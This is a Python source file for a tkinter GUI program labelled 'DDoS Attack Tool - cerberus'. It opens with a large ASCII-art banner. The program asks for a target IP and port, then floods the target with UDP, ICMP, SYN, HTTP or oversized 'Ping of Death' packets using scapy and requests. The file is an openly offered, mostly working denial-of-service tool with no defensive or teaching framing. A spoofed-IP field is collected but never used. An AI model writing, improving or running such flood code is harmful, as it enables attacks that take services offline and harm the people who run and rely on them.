import threading
import time
import tkinter as tk

import requests
import scapy.all as scapy

# ASCII art for the tool's name
cerberus_ascii_art = """
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXWWWWWWWWWWXXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXl,OWWWWWWWW0;:KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNo. ,kWWWWWWO;. :XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWk. ...dNWWNx...  oWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc  ..  ':c;. .'  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc             .  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc                '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc    .'.  .,.    '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWXdoKMWWWWWWWWx.  .;;.   ;:'   cXWWWWWWWWXdxXWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWX0xc. .kWWNXXWWWWNd.  .:.   ;,   :XMWWWNNWWWO. 'lkKNWWWWWWWWWWWWWW
WWWWWWWWWWWXx:..    .:c;,'oNWWWNo..           .:KWWWNx,;clc.    .':xXWWWWWWWWWWW
WWWWWWWWNkc.        .     .;dKWk. .          .. oWXk:.     .        'cONWWWWWWWW
WWWWWWWKo'         ..        ok'   .        ..  .xd.       ..         .l0WWWWWWW
WWWWWWNo:c:,                .:.    ..       .    .c.        .       ';:coXWWWWWW
WWWWWW0,.',.       ..       ;;      ........      ::       ..       .;,.,0WWWWWW
WWWWNO;            .        ',                    ..        .            ;OWWWWW
WWWKl.            '.        ;'                    .,        ...           .lKWWW
WNk'     ..       .         ':.                  .:,         .        .     'kNW
MO.   ...';codxkkxdc.        ,'                  .,        .:lddddol:,....   .kW
WNklc::oOXWWWWWWWWWWXl        ..                ..        :0WWWWWWWWWNKko:;:cxXW
WWWWWNWWWWWWWWWWWWWWWk.        .'              ''        .xWWWWWWWWWWWWWWWXNWWWW
WWWWWWWWWWWWWWWWWWWWW0d,        ,c.          .c:        'oONWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWKl,.      'c'        .c,      ..:0WWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWNNKxc;.   .;;.    .;:.   .,:o0XNWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXko:'.,;'..':,..;lx0NWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXOO0K00kk0XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
MWWWMWWWWWWWWWWMWWWMWWWMWWWWWWWWWWMWWWMWWWWMWWWWWWWWWWMWWWMWWWMWWWMWWWWWWWWWWMWW

"""

# Constants for data transfer size
BYTES_PER_GB = 1024 * 1024 * 1024

# Calculate the packet size based on the ASCII art
packet_size = len(cerberus_ascii_art.encode())

# Set the data transfer size to 1 GB
data_transfer_size = BYTES_PER_GB

# Create the GUI window
root = tk.Tk()
root.title("DDoS Attack Tool - cerberus")

# Create the input fields for target IP address, spoofed IP address, port number, number of packets, and burst interval
tk.Label(root, text="Enter IP Address of The Target").pack()
target_entry = tk.Entry(root)
target_entry.pack()

tk.Label(root, text="Enter The Spoofed IP Address").pack()
fake_ip_entry = tk.Entry(root)
fake_ip_entry.pack()

tk.Label(root, text="Enter The Port Number").pack()
port_entry = tk.Entry(root)
port_entry.pack()

tk.Label(root, text="Enter Number of Packets to Send").pack()
num_packets_entry = tk.Entry(root)
num_packets_entry.pack()

tk.Label(root, text="Enter Burst Interval (in seconds)").pack()
burst_interval_entry = tk.Entry(root)
burst_interval_entry.pack()

# Create the attack type selection menu
tk.Label(root, text="Select Attack Type").pack()
attack_type_entry = tk.StringVar(root)
attack_type_entry.set("UDP Flood")  # Default attack type

attack_type_options = [
    "UDP Flood", "ICMP Echo", "SYN Flood", "HTTP Flood", "Ping of Death"
]

attack_type_menu = tk.OptionMenu(root, attack_type_entry, *attack_type_options)
attack_type_menu.pack()


# Define the attack functions for each attack type
def udp_flood_attack(target, port, num_packets, burst_interval):
  global attack_num

  try:
    for _ in range(num_packets):
      scapy.send(
          scapy.IP(dst=target) / scapy.UDP(dport=port) /
          scapy.RandString(1024))
      attack_num += 1
      port = (port + 1) % 65535
      print(f"Sent {attack_num} packet to {target} through port: {port}")
      time.sleep(burst_interval)
  except Exception as e:
    print("An error occurred during the UDP flood attack:", e)


def icmp_echo_attack(target, num_packets, burst_interval):
  global attack_num

  try:
    for _ in range(num_packets):
      scapy.send(scapy.IP(dst=target) / scapy.ICMP())
      attack_num += 1
      print(f"Sent {attack_num} ICMP echo request to {target}")
      time.sleep(burst_interval)
  except Exception as e:
    print("An error occurred during the ICMP echo attack:", e)


def syn_flood_attack(target, port, num_packets, burst_interval):
  global attack_num

  try:
    for _ in range(num_packets):
      scapy.send(scapy.IP(dst=target) / scapy.TCP(dport=port, flags="S"))
      attack_num += 1
      port = (port + 1) % 65535
      print(f"Sent {attack_num} SYN packet to {target} through port: {port}")
      time.sleep(burst_interval)
  except Exception as e:
    print("An error occurred during the SYN flood attack:", e)


def http_flood_attack(target, port, num_packets, burst_interval):
  global attack_num

  try:
    url = f"http://{target}:{port}/"
    headers = {
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }

    for _ in range(num_packets):
      requests.get(url, headers=headers)
      attack_num += 1
      print(f"Sent {attack_num} HTTP request to {url}")
      time.sleep(burst_interval)
  except Exception as e:
    print("An error occurred during the HTTP flood attack:", e)


def ping_of_death_attack(target, num_packets, burst_interval):
  global attack_num

  try:
    for _ in range(num_packets):
      scapy.send(scapy.IP(dst=target) / scapy.ICMP() / ("X" * 60000))
      attack_num += 1
      print(f"Sent {attack_num} oversized ICMP packet to {target}")
      time.sleep(burst_interval)
  except Exception as e:
    print("An error occurred during the Ping of Death attack:", e)


# Define the function to start the attack
def start_attack():
  target = target_entry.get()
  fake_ip_entry.get()
  port = int(port_entry.get())
  num_packets = int(num_packets_entry.get())
  burst_interval = float(burst_interval_entry.get())

  attack_type = attack_type_entry.get(
  )  # Get the selected attack type from the GUI

  if attack_type == "UDP Flood":
    attack_thread = threading.Thread(target=udp_flood_attack,
                                     args=(target, port, num_packets,
                                           burst_interval))
  elif attack_type == "ICMP Echo":
    attack_thread = threading.Thread(target=icmp_echo_attack,
                                     args=(target, num_packets,
                                           burst_interval))
  elif attack_type == "SYN Flood":
    attack_thread = threading.Thread(target=syn_flood_attack,
                                     args=(target, port, num_packets,
                                           burst_interval))
  elif attack_type == "HTTP Flood":
    attack_thread = threading.Thread(target=http_flood_attack,
                                     args=(target, port, num_packets,
                                           burst_interval))
  elif attack_type == "Ping of Death":
    attack_thread = threading.Thread(target=ping_of_death_attack,
                                     args=(target, num_packets,
                                           burst_interval))
  else:
    print("Invalid attack type selected.")
    return

  attack_thread.start()


# Create the start attack button
tk.Button(root, text="Start Attack", command=start_attack).pack()

# Run the GUI main loop
root.mainloop()
